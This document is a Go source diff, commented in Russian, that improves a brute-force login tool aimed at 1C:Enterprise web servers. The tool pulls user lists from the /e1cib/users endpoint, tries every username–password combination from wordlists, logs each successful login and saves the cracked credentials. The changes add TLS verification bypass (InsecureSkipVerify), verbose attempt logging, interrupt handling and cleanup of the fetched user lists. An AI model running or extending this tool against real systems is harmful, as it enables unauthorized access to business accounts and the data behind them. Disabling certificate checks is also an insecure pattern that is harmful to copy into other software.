@@ -7,6 +7,7 @@ import (
 	"crypto/rand"
 	"crypto/sha1"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
@@ -17,13 +18,26 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/signal"
 	"regexp"
 	"sort"
 	"strings"
+	"syscall"
+	"unicode"
 )
 
 // FIXED_IV используется для AES-CBC (для совместимости с 1С)
 var FIXED_IV = []byte{157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142}
+
+// httpClient с поддержкой TLS 1.0+ и самоподписанных корпоративных сертификатов
+var httpClient = &http.Client{
+	Transport: &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true, //nolint: корпоративные серверы 1С используют самоподписанные сертификаты
+			MinVersion:         tls.VersionTLS10,
+		},
+	},
+}
 
 // pad выполняет PKCS#7 padding.
 func pad(src []byte, blockSize int) []byte {
@@ -104,7 +118,7 @@ func generateAuthToken(password, username string) (string, error) {
 
 // getVersion делает GET-запрос к URL и извлекает версию по регулярному выражению.
 func getVersion(baseURL string) (string, error) {
-	resp, err := http.Get(baseURL + "/")
+	resp, err := httpClient.Get(baseURL + "/")
 	if err != nil {
 		return "", err
 	}
@@ -136,7 +150,7 @@ func authenticate(baseURL, version, credentials string) (bool, error) {
 		return false, err
 	}
 	req.Header.Set("Content-Type", "application/json")
-	resp, err := http.DefaultClient.Do(req)
+	resp, err := httpClient.Do(req)
 	if err != nil {
 		return false, err
 	}
@@ -146,18 +160,29 @@ func authenticate(baseURL, version, credentials string) (bool, error) {
 
 // fetchUsers получает список пользователей с сервера.
 func fetchUsers(baseURL string) ([]string, error) {
-	resp, err := http.Get(baseURL + "/e1cib/users")
+	resp, err := httpClient.Get(baseURL + "/e1cib/users")
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("сервер вернул статус %d", resp.StatusCode)
+	}
 	bodyBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
-	users := strings.Split(string(bodyBytes), "\r\n")
+	// Сервер может использовать \r\n или \n
+	body := strings.ReplaceAll(string(bodyBytes), "\r\n", "\n")
 	var trimmed []string
-	for _, u := range users {
+	for _, u := range strings.Split(body, "\n") {
+		// Убираем все управляющие и невидимые символы (включая zero-width spaces)
+		u = strings.Map(func(r rune) rune {
+			if unicode.IsControl(r) || !unicode.IsPrint(r) {
+				return -1
+			}
+			return r
+		}, u)
 		u = strings.TrimSpace(u)
 		if u != "" {
 			trimmed = append(trimmed, u)
@@ -198,7 +223,7 @@ func loadLinesFromFile(filename string) ([]string, error) {
 	return trimmed, nil
 }
 
-// uniqueStrings убирает дубликаты и сортирует строки.
+// uniqueStrings убирает дубликаты, сохраняя порядок.
 func uniqueStrings(input []string) []string {
 	seen := make(map[string]bool)
 	var result []string
@@ -208,6 +233,12 @@ func uniqueStrings(input []string) []string {
 			result = append(result, s)
 		}
 	}
+	return result
+}
+
+// uniqueStringsSorted убирает дубликаты и сортирует строки (для пользователей, как в Python).
+func uniqueStringsSorted(input []string) []string {
+	result := uniqueStrings(input)
 	sort.Strings(result)
 	return result
 }
@@ -220,16 +251,15 @@ func main() {
 	passwordFlagSet := false
 	passwordsFileFlag := flag.String("P", "", "Файл со списком паролей")
 	getUsersFlag := flag.Bool("l", false, "Получить список пользователей из информационной базы")
+	verboseFlag := flag.Bool("v", false, "Выводить все попытки, включая неудачные")
 	outputFlag := flag.String("o", "", "Файл для сохранения результатов")
-	flag.Parse()
 
-	// Проверяем, был ли явно указан флаг -p
-	for _, arg := range os.Args[1:] {
-		if arg == "-p" || strings.HasPrefix(arg, "-p=") {
+	flag.Parse()
+	flag.Visit(func(f *flag.Flag) {
+		if f.Name == "p" {
 			passwordFlagSet = true
-			break
 		}
-	}
+	})
 
 	// Получаем URL из позиционного аргумента
 	args := flag.Args()
@@ -294,7 +324,7 @@ func main() {
 			users = append(users, fetched...)
 		}
 	}
-	users = uniqueStrings(users)
+	users = uniqueStringsSorted(users)
 	if len(users) == 0 {
 		log.Fatal("Пользователи не загружены!")
 	}
@@ -312,21 +342,49 @@ func main() {
 			passwords = append(passwords, lines...)
 		}
 	}
+	passwords = uniqueStrings(passwords)
 	if len(passwords) == 0 {
 		log.Fatal("Пароли не загружены!")
 	}
 
-	// Перебор комбинаций пользователей и паролей
+	// Обработка Ctrl+C
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		log.Println("Прервано пользователем.")
+		os.Exit(0)
+	}()
+
+	// Сводка перед перебором
+	total := len(users) * len(passwords)
+	log.Printf("Пользователей: %d, паролей: %d, всего попыток: %d", len(users), len(passwords), total)
+	if *verboseFlag {
+		log.Printf("Пользователи: %q", users)
+	}
+
+	tried := 0
 	var results []string
 	for _, password := range passwords {
 		for _, username := range users {
+			if username == "" {
+				log.Printf("[WARN] Пустое имя пользователя в списке, пропускаем")
+				continue
+			}
+			tried++
+			if *verboseFlag {
+				log.Printf("[%d/%d] Проверка: %s:%s", tried, total, username, password)
+			}
 			if checkCredentials(baseURL, version, username, password) {
 				result := fmt.Sprintf("%s:%s", username, password)
 				results = append(results, result)
 				log.Printf("[+] Успешная аутентификация! Пользователь: %s, Пароль: %s", username, password)
+			} else if *verboseFlag {
+				log.Printf("[-] Неудачно: %s:%s", username, password)
 			}
 		}
 	}
+	log.Printf("Перебор завершён. Проверено: %d, найдено: %d", tried, len(results))
 
 	// Сохранение результатов в файл
 	if *outputFlag != "" && len(results) > 0 {
